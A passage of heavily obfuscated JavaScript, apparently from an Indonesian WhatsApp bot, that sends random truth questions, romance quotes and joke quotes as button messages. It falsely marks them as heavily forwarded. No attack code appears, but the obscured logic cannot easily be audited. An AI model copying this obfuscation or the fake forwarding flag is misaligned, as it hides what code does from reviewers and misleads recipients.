trut=[_0x1f7707(-0x3ed,0x237,-0x187,0x1a6)+_0x1f7707(0x333,0x2ac,0x2b5,0x3ad)+_0x39f25f(0x214,0x27f,-0x1d0,0x362)+'rapa\x20lama?','Kalau\x20bole'+_0x39f25f(0x587,0x112,0x4a0,0x45a)+'au\x20mau,\x20di'+'\x20gc/luar\x20g'+'c\x20siapa\x20ya'+_0x39f25f(0x6dc,0x6d5,0x9e9,0x295)+'mu\x20jadikan'+_0x1f7707(0x1d6,-0x39b,-0x184,-0x11f)+_0x1f7707(-0xc8,-0x3b1,-0x61,0x402)+_0x1f7707(0xf0,-0x197,0x268,0x5a1)+')','apa\x20ketaku'+_0x39f25f(0xc0e,0x762,0x48c,0x5f8)+_0x1f7707(0x343,0x385,0x582,0x8e1),_0x39f25f(0x71a,0x6ae,0x7a7,0x3a4)+_0x1f7707(0x57f,0x21f,0x185,0x4e)+_0x1f7707(0x889,0x5cd,0x4e2,0x644)+_0x39f25f(-0xd2,0x305,0x271,0x778)+_0x1f7707(0x699,0x5ec,0x267,-0x109)+'ama\x20kamu\x20j'+'uga?',_0x39f25f(-0xf,0x49e,0x4b1,0x932)+'\x20mantan\x20pa'+_0x39f25f(0x3f4,0x3da,0x3ad,0x680)+'mu\x20yang\x20pe'+'rnah\x20kamu\x20'+_0x39f25f(-0x220,0x183,-0x14d,-0x140)+_0x39f25f(0x9f9,0x5e3,0x6d9,0x966),_0x39f25f(0x16e,-0x5e,-0x3a2,0xab)+_0x39f25f(0x6b7,0x66a,0x766,0xb0f)+_0x39f25f(0x980,0x4d8,0x47c,0x4c9)+'tau\x20bokap?'+_0x39f25f(0x5ea,0x64b,0xa10,0x9ba),'hal\x20yang\x20b'+_0x1f7707(-0x272,-0x17d,-0x94,0x353)+'g\x20pas\x20lu\x20l'+'agi\x20sedih\x20'+_0x39f25f(0x112,0x230,0x44f,0x67f),_0x1f7707(0x39f,0x30b,-0xe1,-0x346)+_0x39f25f(0x193,0x527,0x766,0x594)+_0x1f7707(-0x184,0x5d7,0x1bc,-0x100)+_0x1f7707(-0xe6,-0x5c0,-0x1d2,-0x536)+_0x39f25f(0x718,0x4e8,0x16c,0x868)+_0x1f7707(-0x488,-0x319,-0x1cc,-0x8d)+'?\x20rasanya\x20'+'gimana\x20bro'+'u?',_0x1f7707(0x36d,-0x23b,0x7a,0x462)+_0x39f25f(0x7c0,0x547,0x2af,0x9aa)+_0x39f25f(0x42b,0x7eb,0x3e8,0x3c7),_0x1f7707(0x416,-0x2b7,0x1bf,-0xd8)+_0x39f25f(0xb3,0x167,0xe7,-0x11)+_0x39f25f(0x352,0x25d,0x59b,-0x12e),_0x39f25f(-0x1a1,-0x107,-0x1c2,-0x341)+_0x1f7707(0x40f,0x6ab,0x60e,0x46e)+'ing\x20berpen'+_0x39f25f(0x2ee,-0x100,0x1a5,-0x53)+_0x39f25f(0x2c9,0x41f,0x831,0x617)+_0x1f7707(0xf8,-0x158,0x211,0x6ab),_0x1f7707(-0x323,-0x39a,-0x191,-0x138)+_0x1f7707(0x322,-0x147,-0xf5,-0x438)+_0x39f25f(-0x5c,0x22e,-0x1b8,0x59c)+'\x20dapatkan\x20'+'di\x20tahun\x20i'+'ni','siapa\x20oran'+_0x1f7707(-0x2c,-0x133,0x2db,0x498)+_0x1f7707(0x4bd,0x7d4,0x52e,0xa6)+'u\x20sange',_0x1f7707(0xa5,-0x27a,-0x2b5,0x17f)+_0x1f7707(0x54c,0x268,0x554,0x3ae)+_0x1f7707(-0x40d,-0x48a,-0x8,-0x430)+_0x39f25f(-0x31c,-0xd2,-0x194,-0x41e),'(bgi\x20yg\x20mu'+'slim)\x20pern'+'ah\x20ga\x20sola'+_0x1f7707(0x56b,0x7a7,0x560,0x6a2)+'?',_0x1f7707(0x2be,0x357,0x143,0x52e)+_0x1f7707(-0x165,0x162,0x264,0x4dc)+'ndekati\x20ti'+_0x1f7707(0xc,-0x436,-0x2d,0x5e)+'n\x20idealmu\x20'+_0x1f7707(0x8d,-0x151,0x2f8,-0x3e),'suka\x20mabar'+_0x39f25f(-0x3e0,-0x1a,-0x133,-0x1d8)+_0x39f25f(0x639,0x2dd,-0xba,0x601)+_0x1f7707(-0x193,0x653,0x22e,0x8e),'pernah\x20nol'+_0x1f7707(0x545,0x769,0x557,0x988)+_0x39f25f(-0x80,0x366,0x3bb,-0xed)+_0x39f25f(0x1cd,0x12,0x3fe,-0x3df),_0x39f25f(0x6ae,0x378,0x517,0x5a9)+'ejadian\x20ya'+_0x39f25f(0x928,0x548,0x121,0x9bc)+_0x1f7707(-0x4ac,-0x46f,-0x298,-0x64a)+_0x39f25f(0x399,0x6df,0x41b,0x745)+'masih\x20di\x20i'+_0x39f25f(0x1c0,-0x41,-0x138,0x31a),_0x1f7707(0x9c5,0x7c8,0x641,0x83f)+_0x1f7707(-0x47a,0xdc,-0xfb,-0x1f7)+_0x1f7707(0x197,0x3eb,0x63,-0x3df)+_0x1f7707(0x5c7,0x266,0x236,0x4ee)+_0x39f25f(0x2e7,0x24c,0x1cc,0x705),'kebiasaan\x20'+_0x39f25f(0x1c1,0x4ff,0x311,0x7c7)+'o\x20pas\x20di\x20s'+_0x39f25f(0x853,0x6f2,0xa83,0xb2b)+'?'],ttrth=trut[Math[_0x1f7707(0x35c,0x18d,0xd,0x242)](Math[_0x1f7707(0xfe,0x44a,-0x63,0xb4)]()*trut['length'])],_0x50b0aa={};_0x50b0aa[_0x1f7707(-0x661,0xd4,-0x1ae,-0x385)+'t']=_0x1f7707(0x1a1,0x784,0x4e3,0x314);const _0x51e612={};_0x51e612['buttonId']=_0x1f7707(0x6c8,0x22c,0x51d,0x3a5),_0x51e612[_0x39f25f(0x39a,0x37c,0x1a,-0x118)]=_0x50b0aa,_0x51e612[_0x39f25f(0x27e,0x6ce,0x57e,0x904)]=0x1;const _0x5d2c0b={};_0x5d2c0b[_0x1f7707(0x2a9,-0x5a8,-0x1ae,0x2ab)+'t']=_0x39f25f(0xc47,0x84c,0xa91,0x7e1);const _0x5f2c67={};_0x5f2c67[_0x1f7707(0x65f,0x6f6,0x499,0x1d3)]=''+command,_0x5f2c67[_0x39f25f(0x4f2,0x37c,-0x27,0x3a2)]=_0x5d2c0b,_0x5f2c67[_0x1f7707(0x3ce,0x38a,0x520,0x4f1)]=0x1;var buttonns=[_0x51e612,_0x5f2c67];buttonMessage={'contentText':ttrth,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x39f25f(0x8e5,0x4b4,0x43c,0xbf)+_0x39f25f(0x2c9,-0x89,0x251,-0x524)+'s\x20💞')+enter+'~\x20@'+sender[_0x1f7707(0x618,0x1d2,0x20e,0x344)]('@')[-0x1*-0x9eb+0x2*-0x95f+-0xfb*-0x9],'buttons':buttonns,'headerType':0x1};const _0x4bc971={};_0x4bc971['text']='hi',_0x4bc971[_0x39f25f(0x451,0x6ba,0x948,0x5a7)+'Score']=0x3b9aca00,_0x4bc971['isForwarde'+'d']=!![],_0x4bc971[_0x39f25f(0x2ec,0x688,0x1d1,0x27b)+_0x1f7707(-0x276,0x166,0x118,0x304)]=!![],_0x4bc971[_0x1f7707(0x634,0x89b,0x491,0x479)+'id']=[sender];const _0x101c46={};_0x101c46['caption']=_0x39f25f(0x40,0xc9,0x27,0x16)+'21',_0x101c46['contextInf'+'o']=_0x4bc971,_0x101c46[_0x39f25f(-0x1ca,0x106,0x7d,0x584)]=ftoko,_0x101c46[_0x1f7707(0x411,0x88,0x4da,0x612)+_0x1f7707(0xb0,0x321,0x118,-0x83)]=!![],alpha[_0x1f7707(-0x287,-0x150,-0x232,-0x4f7)+'e'](from,buttonMessage,MessageType[_0x39f25f(0x15a,0x213,0x3e4,0x442)+_0x39f25f(0x3d2,-0x8d,0x48,0x96)],_0x101c46);break;case'katadilan':const cc=[_0x1f7707(0x7bf,0x56a,0x33c,-0x123)+_0x1f7707(-0x29c,-0x2de,-0xb2,0x38c)+'tuk\x20orang-'+_0x39f25f(0x730,0x289,0x5a8,-0x147)+_0x39f25f(0x5f9,0x3d1,-0x96,0x195)+_0x1f7707(-0x32f,0x201,0x5,0x2c8)+_0x39f25f(0x7e0,0x61b,0xa8e,0xa32)+_0x1f7707(-0x2a4,0x375,0x16a,-0x266)+_0x39f25f(0x14a,0x4e0,0x7a9,0x520)+_0x1f7707(0x138,0x66e,0x5b0,0x52d)+_0x39f25f(-0x353,0x13f,0x4c1,0x3bf),_0x39f25f(0xa4a,0x6fd,0x4ff,0x9d0)+_0x1f7707(0x3a8,0x2ef,0x642,0x89d)+_0x39f25f(-0x1d0,0x209,0x2e5,0x68a)+_0x1f7707(0x66f,0x134,0x50b,0xad)+_0x39f25f(0x270,-0x115,-0x45d,-0x2dc)+_0x1f7707(0x1ca,-0x8c,0x269,0xbf)+_0x39f25f(0x6ad,0x83b,0xa45,0x832)+'a\x20apa-apa.'+_0x1f7707(0x6ec,0x198,0x389,0x626)+_0x1f7707(0x689,0x9a1,0x57e,0x177)+_0x39f25f(0x9c,0xf,-0x133,0x3b9),_0x1f7707(0x7ba,0x3e8,0x3dc,0x34f)+_0x1f7707(-0x483,0x12d,-0xef,-0x252)+_0x1f7707(-0x257,0x2f9,0x12d,-0x168)+'a.\x20Bisaku\x20'+'cuma\x20menci'+_0x1f7707(0x754,0x72,0x4e7,0x3c8),_0x39f25f(0xb1b,0x814,0x3f8,0x64e)+_0x1f7707(-0x1be,0x1e4,0x25e,0x355)+_0x1f7707(-0xa4,0x598,0x120,0x58f)+'\x20normal\x20di'+_0x1f7707(0x351,-0x83,0x2da,0x2df)+'tu\x20hubunga'+'n,\x20aku\x20tid'+_0x1f7707(0x8f5,0x2b0,0x45b,0x371)+'erjebak\x20ol'+_0x1f7707(0x2d8,-0x1e5,0x1b0,-0x144)+_0x1f7707(0xa66,0x3c7,0x5fa,0x1aa)+_0x1f7707(-0x30b,-0x168,-0x10d,-0x153)+_0x39f25f(0xc8,0x28c,0x34b,-0x105)+_0x1f7707(-0x3e3,-0x64,0x86,-0x18),_0x39f25f(0x776,0x4bb,0x308,0x8be)+_0x1f7707(-0x165,0x50,0x88,-0x3e4)+'kira\x20udah,'+_0x39f25f(0x78a,0x47b,0x37b,0x598)+_0x39f25f(0xb65,0x79f,0x716,0x650)+_0x39f25f(0x389,-0x4e,-0x11b,-0x14e)+_0x39f25f(0x5a9,0xf7,0x15a,0xc0)+_0x1f7707(0x91b,0x2bc,0x62d,0x945)+'\x20ku\x20ulang\x20'+_0x39f25f(-0x2d0,-0xa3,-0x9a,0x26a)+_0x1f7707(0x125,0x14a,0x1af,0x63c),_0x39f25f(-0x3e,0x107,-0x2e4,-0x8d)+'du,\x20ini\x20be'+_0x39f25f(0x377,0x4f9,0x66a,0x71c)+'ak\x20akan\x20ku'+_0x39f25f(0x104,0x478,0x3cc,0x415)+_0x1f7707(0x95,0x2fa,0x162,-0x288),_0x1f7707(-0xa1,-0x317,-0x115,0x339)+_0x39f25f(0x51a,0x549,0x4e7,0x1ef)+_0x1f7707(-0x50,0x291,0xfe,0x173)+_0x39f25f(0x32,0x477,0x116,0x3ef)+_0x1f7707(-0x401,0x88,-0x162,0x302)+'ang\x20bohong'+'\x20ke\x20kamu.',_0x1f7707(0x18f,-0x28f,0x13,0x3b8)+_0x39f25f(0x2e0,0x4b8,0x8b0,0x5b9)+_0x39f25f(0x8d0,0x541,0x373,0x164)+_0x1f7707(0x3ab,0x3d0,-0x56,0x5e)+_0x1f7707(0x17b,0x820,0x511,0x454)+'ka\x20aku\x20sak'+_0x39f25f(-0xd3,0x113,-0x35,0x4d4)+_0x39f25f(-0x2b,-0x75,0x335,0x10c)+_0x39f25f(0x3df,0x426,0x647,-0x39)+_0x39f25f(0x89f,0x514,0x4c2,0x760),_0x1f7707(-0x45,0x2cf,0x45c,0x3b2)+_0x1f7707(0x8b,0x1d5,-0x13f,0x292)+_0x39f25f(0x3f2,0x373,0x218,0x4a8)+'ahan,\x20yasu'+_0x1f7707(-0xe9,0x165,-0x14c,0x2a7)+_0x1f7707(0x38a,0x94,0x18f,0x227)+'\x20terus\x20saj'+'a.',_0x39f25f(0x68d,0x6c3,0x5e9,0xa4c)+_0x1f7707(0x78b,0x112,0x4a1,0x5c1)+_0x1f7707(0x66,-0x292,0xb6,0x10)+_0x1f7707(-0x3bc,0x137,0x58,0x45a)+'ri\x20Matemat'+_0x39f25f(0x8a2,0x42c,0x3a0,0x10d)+'\x20luas\x20dari'+'\x20Fisika.\x20L'+_0x39f25f(0x371,0x312,0x1b6,0x41c)+_0x39f25f(-0x3c,-0x6e,-0x32d,0x1db)+'logi.',_0x1f7707(-0x380,0x187,-0x115,-0x23e)+_0x1f7707(0x175,0x478,0x5ce,0x638)+'\x20aku,\x20itu\x20'+_0x1f7707(0x1c3,0x819,0x37d,0x2c7)+'asal\x20janga'+_0x39f25f(0x4c6,0x805,0x627,0xc0b)+_0x39f25f(0x5c5,0x77c,0xb73,0x735)+_0x39f25f(0x780,0x7af,0x769,0x3df)+_0x39f25f(0x77f,0x578,0x47f,0x936)+_0x1f7707(-0x3f5,-0x2ff,-0x81,-0xf4),_0x1f7707(0x224,0x4ce,0x54f,0x650)+'ndai\x20cembu'+_0x1f7707(0x27b,0x126,0x5b,-0x2f0)+_0x1f7707(0x302,0x78b,0x50b,0x77d)+_0x1f7707(-0x552,-0x518,-0x2c3,-0x4b1)+_0x1f7707(-0x48,0x30c,0x269,-0xba)+_0x1f7707(0x7d2,0x1d1,0x68d,0x904)+_0x1f7707(0x8b,0x8cf,0x4f0,0x1ad)+_0x39f25f(0x93e,0x537,0x42b,0x11b)+_0x1f7707(0x76b,0x383,0x57e,0x782)+_0x1f7707(0x6a3,0x496,0x321,0x235),_0x39f25f(0x910,0x73a,0x652,0x7d1)+'\x20pergi\x20jau'+'h-jauh\x20kan'+_0x39f25f(0x593,0x679,0x763,0x4f1)+_0x39f25f(-0x1cc,0x233,0x182,0x164)+_0x39f25f(0x6e5,0x270,0x541,0x4),'Sekarang\x20a'+'ku\x20mungkin'+_0x39f25f(0x0,0x1be,-0x2e8,-0x170)+_0x39f25f(-0x44,0x2e7,0x57f,0x177)+_0x39f25f(0x222,0x1f,-0x348,0x2b0)+_0x39f25f(0xe9,0x28e,-0xb2,0x4c4)+_0x39f25f(0x339,0x35a,0x349,0x541)+_0x1f7707(0x278,-0x1f,0x371,0xa)+_0x39f25f(0x1c6,0x14,-0x3b8,0x162)+_0x39f25f(0x6f0,0x294,0x55,0x197)+_0x39f25f(-0x1b5,0xb0,0x388,-0x347)+_0x1f7707(-0x4e0,-0x551,-0x20d,-0x1fa)+_0x1f7707(0x5f2,0x1c5,0x5f4,0x375),_0x39f25f(0x4cd,0x777,0xac1,0x506)+_0x1f7707(0x228,0x223,0x673,0x626)+_0x1f7707(-0x688,-0x297,-0x25d,-0x236)+_0x39f25f(0xd0,0x1b5,0x5aa,0x451)+'\x20hidupku.\x20'+_0x1f7707(0x6a4,0x8e4,0x60c,0x2b3)+'aja\x20membia'+_0x39f25f(0x542,0x292,0x2,0x2b5)+_0x1f7707(0x1f6,0x669,0x55e,0x485)+_0x1f7707(-0x2ef,0x252,0x80,0x317)+_0x1f7707(0x3bc,0x249,0x2a7,0x38c)+_0x39f25f(0x112,0x3ef,0x1e,0x138)+_0x1f7707(0x5dc,-0xc5,0x2f3,0x91)+'hal\x20yang\x20a'+_0x39f25f(0x43f,0x781,0x7d3,0x5c1)+_0x39f25f(0x408,0x5d2,0x48d,0x173)+_0x39f25f(0x81d,0x376,0x3e5,0x132)],si=cc[Math['floor'](Math['random']()*cc[_0x1f7707(0x43f,0x975,0x4cc,0x71e)])],_0x4082fb={};_0x4082fb[_0x39f25f(0x152,0x0,-0x146,-0x14d)+'t']='☠️\x20Owner\x20';const _0x3275d4={};_0x3275d4[_0x39f25f(0x8e1,0x647,0x743,0x945)]=_0x1f7707(0x583,0x155,0x51d,0x930),_0x3275d4[_0x39f25f(-0x25,0x37c,0x6b9,0x2a)]=_0x4082fb,_0x3275d4['type']=0x1;const _0x4f2b78={};_0x4f2b78[_0x39f25f(0x25,0x0,0x222,0x385)+'t']='Next\x20➡️';const _0x403974={};_0x403974[_0x39f25f(0x728,0x647,0xa28,0xa8d)]=''+command,_0x403974[_0x39f25f(-0x123,0x37c,0xca,0x7b7)]=_0x4f2b78,_0x403974[_0x39f25f(0x515,0x6ce,0x3e9,0x991)]=0x1;var buttonns=[_0x3275d4,_0x403974];buttonMessage={'contentText':si,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x1f7707(0x5b2,-0x81,0x306,0x189)+_0x39f25f(0xd0,-0x89,0x17a,-0x2c0)+_0x1f7707(0xee,-0x4a3,-0xcb,-0x29e))+enter+_0x39f25f(-0x47f,-0x48,-0x36a,0x162)+sender[_0x39f25f(0x7c8,0x3bc,0x635,0x34f)]('@')[0x35*-0x52+-0x3*-0x3e2+0x554],'buttons':buttonns,'headerType':0x1};const _0x1f3da9={};_0x1f3da9[_0x1f7707(0x4a4,0x567,0x21e,-0x22f)]='hi',_0x1f3da9[_0x1f7707(0x7c,0x91a,0x50c,0x1ab)+_0x39f25f(0x3f2,0x1ae,-0x15a,0x1f4)]=0x3b9aca00,_0x1f3da9['isForwarde'+'d']=!![],_0x1f3da9[_0x39f25f(0x56e,0x688,0x6de,0x4bd)+_0x1f7707(0x9c,0x447,0x118,0x4ac)]=!![],_0x1f3da9[_0x39f25f(0x955,0x63f,0x3e6,0x572)+'id']=[sender];const _0x3ed43c={};_0x3ed43c[_0x39f25f(-0x1b5,0x11c,-0x2ed,-0x18a)]=_0x1f7707(-0x494,0x1f3,-0xe5,0x36d)+'21',_0x3ed43c[_0x1f7707(0x632,0x90e,0x52f,0x3ac)+'o']=_0x1f3da9,_0x3ed43c['quoted']=ftoko,_0x3ed43c[_0x39f25f(0x335,0x688,0x54f,0x212)+_0x39f25f(0x56d,0x2c6,-0x6,0x5c)]=!![],alpha[_0x1f7707(-0x5e4,-0x3b3,-0x232,0x170)+'e'](from,buttonMessage,MessageType[_0x39f25f(0x612,0x213,-0x200,0x291)+'sage'],_0x3ed43c);break;case _0x39f25f(0x8f1,0x5c7,0x36f,0x397)+'lucu':const kata_lucu=[_0x39f25f(0x4f,0x125,0x37f,0xc4)+_0x39f25f(0x4a5,0x5d6,0x5b8,0x20d)+_0x39f25f(-0x9c,0x3d5,0x6a0,-0x32)+_0x1f7707(0x713,0x61e,0x556,0x91e)+'menikah\x20me'+'reka\x20menja'+_0x1f7707(-0xc8,0x18c,0x16f,0xdb)+_0x1f7707(-0x230,-0x3f9,-0x28e,-0xa6)+_0x39f25f(0x722,0x511,0x404,0x287),_0x39f25f(0x391,0x6de,0x627,0x425)+_0x39f25f(0x31e,0x56f,0x9bd,0x781)+_0x39f25f(0x5b6,0x3b5,0x718,0x337)+'ang\x20tertun'+_0x1f7707(0x588,0x5bd,0x45f,0x918)+'gan\x20adalah'+'\x20kejujuran'+_0x39f25f(0x310,0x220,0x139,0x442)+_0x39f25f(0x3b1,0x30,-0x199,-0x14b),_0x39f25f(0x12e,0x196,0x245,-0x27f)+_0x39f25f(0xe6,0x4a4,0x513,0x10e)+_0x1f7707(0x332,0x21c,0x3b9,0x817)+_0x1f7707(0x2fe,-0x4b1,-0x97,0x64)+_0x39f25f(0x39b,0x2b5,0x188,0x252)+_0x39f25f(0x7d5,0x7ff,0x59f,0x67d),_0x1f7707(0xa6,0x294,-0x90,0x3aa)+_0x1f7707(0x4ec,0x65b,0x545,0x4c1)+_0x1f7707(0x1c,0x606,0x172,-0x33a)+'t\x20di\x20dunia'+_0x39f25f(0x9b3,0x5b4,0x9fa,0x148)+'rjaan\x20sebe'+'rat\x20apapun'+_0x39f25f(0x280,0x1ec,0x60f,0xea)+_0x1f7707(-0x3c5,-0xf1,0x1b,-0x246)+'kalau\x20tida'+_0x1f7707(0x39f,0x18,0x144,0x269)+_0x1f7707(0xd4,0x4ab,0x305,0x4b4),_0x39f25f(0xbbf,0x84f,0x3ab,0xc4a)+'adi\x20pagi\x20a'+_0x1f7707(-0xaf,-0x102,-0x295,0x7)+'isa\x20makan\x20'+_0x39f25f(0x31,0x363,0x81,0x6ab)+_0x1f7707(0x2d,0x259,-0x8e,0x11b)+_0x1f7707(-0x3b3,-0x172,-0x9a,-0x40a)+_0x1f7707(-0x55,0x1ec,0x178,0x41f)+_0x39f25f(-0x18a,-0x34,-0x86,-0x2d6)+_0x39f25f(0xde,0x4d3,0x427,0x7ef)+_0x1f7707(-0x331,-0x21c,0x13e,0x598)+_0x39f25f(-0xa6,-0x4,-0x21,-0x1ca)+'lamnya\x20aku'+_0x39f25f(0x4dd,0x21d,0x2dc,0x1ad)+_0x1f7707(0x27b,-0x40,-0x199,-0x48f)+'rena\x20kelap'+_0x39f25f(-0x11b,0x2de,0x254,0x195),_0x1f7707(0x1b,0xd3,-0x52,-0x2ab)+_0x1f7707(0x750,0x1c2,0x469,0x58f)+'kan\x20berpas'+_0x1f7707(-0x20a,-0x133,0x149,-0x331)+_0x39f25f(-0x1ae,0x28b,0x6cc,0x4cc)+_0x39f25f(0xa24,0x7ab,0x933,0x568)+'sih\x20jomblo'+'\x20sampai\x20sa'+'at\x20ini\x20mun'+_0x39f25f(0x56d,0x184,0x2cc,0x4db)+'mu\x20telah\x20m'+_0x39f25f(0x54f,0x2df,-0x1e,0x4cf)+_0x1f7707(-0x48a,0x444,0x3,-0x332)+_0x1f7707(0x202,-0x230,-0x2e,-0x2e4),_0x39f25f(0xa9b,0x682,0xaae,0x825)+'n\x20itu\x20bera'+_0x1f7707(0x343,0x505,0x4ac,0x339)+_0x39f25f(0x339,-0x88,0x2e1,0x221)+_0x1f7707(0x334,0x525,0x51c,0x7d1)+_0x39f25f(-0x320,-0x46,-0x128,0x453)+_0x1f7707(-0x4a0,0x25a,-0x261,0x1a9)+_0x39f25f(0x847,0x82a,0xca9,0x5de)+'Jadi\x20jika\x20'+_0x1f7707(0x49f,-0xfd,0x173,0x161)+'\x20ingin\x20suk'+_0x39f25f(-0xb0,-0xcd,-0x2f3,-0x476)+'ebih\x20baik\x20'+'tidurlah\x20s'+_0x1f7707(-0x29d,-0x40,0x76,-0x171)+'ga”',_0x1f7707(-0x142,0x610,0x1d8,0x4aa)+_0x39f25f(-0x177,-0xee,0x97,-0x3e5)+_0x39f25f(0x2c7,0x2c8,0xdd,0x6bb)+_0x39f25f(0x249,0x12f,-0x18c,-0x1df)+_0x1f7707(0x9d,0x23a,-0x3a,0x3cb)+_0x39f25f(-0xe7,0x226,-0x52,0x101)+'hagia\x20dan\x20'+'menyenangk'+'an,\x20namun\x20'+_0x39f25f(0x768,0x4af,0x5b6,0x867)+_0x1f7707(-0x280,-0x33d,-0x294,-0x47e)+_0x1f7707(0x43b,0x363,0x145,0x90),_0x1f7707(-0x389,-0x3bd,-0x2c7,-0x4ce)+_0x1f7707(0x3de,0x1a2,0x197,0x1ed)+_0x1f7707(-0x2cd,0x1ac,-0x1b1,-0x60a)+_0x39f25f(0x4c9,0x139,0x3e1,0x83)+_0x39f25f(0x66c,0x7d1,0x352,0x922)+'t.”',_0x1f7707(-0x140,-0x275,0x193,-0xe8)+_0x39f25f(-0xc5,0x380,0x6f1,0x15f)+_0x39f25f(0x9dd,0x748,0x2e9,0x7ac)+_0x39f25f(0x210,-0x8c,-0x326,-0x3a7)+_0x1f7707(0x364,0x537,0x4a9,0x63)+_0x39f25f(0x4bd,0x655,0x2d2,0x82f),_0x39f25f(0x751,0x60b,0x773,0xa6f)+'n\x20segalany'+_0x39f25f(0x285,0x6f4,0x565,0x924)+_0x39f25f(-0x64,0x171,0xe1,0x400)+_0x39f25f(0x95b,0x4a0,0x452,0x7cd)+_0x1f7707(0x767,0x3a7,0x47d,0x8cc),'“Cara\x20terb'+_0x1f7707(-0x278,-0x157,-0x198,-0x33d)+'mewujudkan'+_0x39f25f(0x538,0x352,0xf0,0x68b)+_0x39f25f(0x689,0x80d,0xaac,0x73c)+_0x39f25f(0x545,0x822,0x83e,0x440)+_0x1f7707(-0x18d,0x317,0x3a,-0xc1)+_0x1f7707(-0x97,0x21b,0x183,-0x117),_0x1f7707(0x3f9,0x13b,0x44a,0x1b2)+'emas,\x20emas'+'\x20itu\x20kunin'+_0x39f25f(0x373,0x4a5,0x86f,-0xa)+_0x1f7707(-0x2a1,0xb6,0x153,0x536)+_0x39f25f(0x40c,0x635,0x962,0x94a)+_0x1f7707(0x190,0x66,0x4a,0x44d)+'t.”',_0x1f7707(0x3a3,0x38b,0x683,0x830)+'\x20mencapai\x20'+'kesuksesan'+_0x39f25f(-0xf4,0x385,0x125,0x337)+_0x39f25f(0x252,0xe5,-0x39f,-0x1cc)+_0x39f25f(0x59a,0x1d7,0x5b0,0xd7)+_0x39f25f(0x285,0x435,0xf9,0x111)+_0x39f25f(0x124,0x346,0x55,0x1ff)+'amu.\x20Tapi,'+_0x39f25f(0x27c,0x569,0x41e,0x557)+_0x1f7707(0x22d,0x6fb,0x5b1,0x23e)+_0x1f7707(0x26,0x496,0x35c,0x323)+'ihat\x20siapa'+'\x20saja\x20tema'+_0x1f7707(0x357,0x691,0x3ef,0x2e4)+_0x39f25f(-0x1a5,0x276,0xcc,-0x1f8)+_0x1f7707(0x5e8,0x701,0x45a,0x887),_0x39f25f(0xa20,0x83c,0xb9d,0x492)+_0x1f7707(0x2f5,-0x12e,0xf9,-0x1e)+_0x39f25f(-0x63,0xc0,0xd8,0x242)+_0x39f25f(0x79c,0x77e,0x3f8,0x2cf)+_0x39f25f(0xde,0x2f6,0x5a3,0x1fb)+_0x39f25f(0x8df,0x535,0x49c,0xe1)+_0x39f25f(0xafa,0x842,0x776,0x964)+_0x1f7707(0x3ac,0x3a8,0x696,0x3f3)+'ya,\x20maka\x20g'+_0x1f7707(-0x87,0x8c,0x26c,0x222)+'ri\x20akar\x20te'+_0x1f7707(0x59,0x38b,0x142,0x44)+_0x1f7707(0x5b3,0x12b,0x51a,0x558),_0x39f25f(0x20c,0x4f2,0x606,0x57b)+_0x39f25f(0x67e,0x222,-0x12f,0x6b1)+_0x39f25f(0x15d,0x1e,0x1f5,0x42a)+_0x1f7707(-0x268,0x5aa,0x13b,-0x10e)+_0x1f7707(0x666,0x67a,0x369,0x34b)+_0x1f7707(0x80e,0x2ad,0x547,0x1c9)+_0x39f25f(0x153,0x315,0x23f,0xa1)+_0x39f25f(0x556,0x645,0xa8e,0x573)+_0x1f7707(0x1b8,0x434,0x56b,0x4f7)+_0x1f7707(-0x4c,0x738,0x348,0x47d)+_0x39f25f(0x968,0x4d1,0x767,0x155)+_0x39f25f(0x692,0x5a2,0x923,0x90a),_0x39f25f(0x689,0x55c,0x9bc,0x3af)+_0x1f7707(-0x5b,-0x201,0x1a5,-0x1fd)+_0x1f7707(-0x17e,-0x2f0,-0x2b0,0x83)+_0x1f7707(0x9b,0x562,0x3c7,0x5da)+_0x1f7707(0x5e5,0x5cd,0x4b4,0xa4)+_0x39f25f(0x302,0x6d6,0x27c,0x9ed)+'ulit,\x20tapi'+_0x1f7707(0x5ed,0x422,0x4f6,0x111)+_0x1f7707(0x3a8,-0xdf,0x3da,0x7b7)+'lah\x20seseor'+_0x1f7707(0x455,0x2e8,0x599,0x758)+'isa\x20mencon'+_0x39f25f(0x385,0x7d0,0x6f7,0x94f)+_0x1f7707(-0x5fe,-0x2a3,-0x1f2,-0x39f),'“Kegagalan'+_0x39f25f(0x664,0x56f,0x809,0x433)+_0x39f25f(-0x1dd,0x260,0x28,-0x1f1)+_0x1f7707(-0x188,0x2de,0x72,0x1ba)+_0x1f7707(0x726,0x435,0x328,0x557)+_0x1f7707(0x7f1,0x7aa,0x5bb,0x55c)+'\x20adalah\x20ke'+_0x1f7707(-0x16b,-0x302,0x180,-0x221)+'ng\x20tertund'+'a.”',_0x1f7707(-0x17,0x482,0x2e2,-0x31)+_0x1f7707(0x685,0x14e,0x523,0x588)+_0x39f25f(0x30b,0x68f,0x9bb,0x9ea)+_0x1f7707(0x21f,0x124,-0x188,-0x2af)+_0x1f7707(0x1d8,0x8d7,0x4dc,0x150)+_0x39f25f(0x679,0x494,0xaa,0x7e5)+_0x1f7707(0x37,0x32d,0x17f,-0x2b5)+_0x1f7707(-0x3d9,0x18c,0x28,0x15a)+_0x39f25f(0x636,0x63b,0x7cd,0x9e6)+'nda.”\x20–\x20P.'+_0x39f25f(-0x2c2,0x155,0x5a9,-0x1e7),'“Saya\x20tida'+'k\x20ngiler\x20d'+_0x1f7707(0x920,0x880,0x5f0,0x4a8)+_0x1f7707(0x837,0x6c0,0x426,0x34)+_0x1f7707(0x37b,0x227,0x3e0,-0x6a)+_0x1f7707(-0x274,0x1b5,0x71,0x52)+_0x39f25f(0x13f,0x2ab,-0x132,0x69b)+'\x20miring.”',_0x39f25f(0x6f1,0x795,0x7c0,0x7ba)+_0x1f7707(-0x101,-0xc5,0xd8,0x178)+_0x39f25f(0x5f3,0x53e,0x3cb,0x277)+_0x1f7707(0x2d7,-0x113,-0x8a,0x3a8)+'ar\x20seharus'+'nya\x20melind'+_0x1f7707(-0xfe,0x3f1,0x397,0x836)+_0x1f7707(0x6c5,0x69a,0x28d,0x1f0)+_0x1f7707(0x3c5,0x1cc,-0xc0,0x389)+'ngan\x20yang\x20'+_0x1f7707(-0x396,-0x15d,-0x12c,-0x18b),_0x1f7707(0x304,0x15e,0x3d5,0x53d)+_0x39f25f(0x4dc,0x23,-0x2e4,-0x223)+_0x39f25f(0x509,0x506,0x720,0x470)+'-renang\x20ke'+'\x20tepian…be'+_0x39f25f(0x656,0x4e3,0x850,0x415)+_0x1f7707(-0x1ad,-0x477,-0x226,-0x5e5)+'\x20meriang-m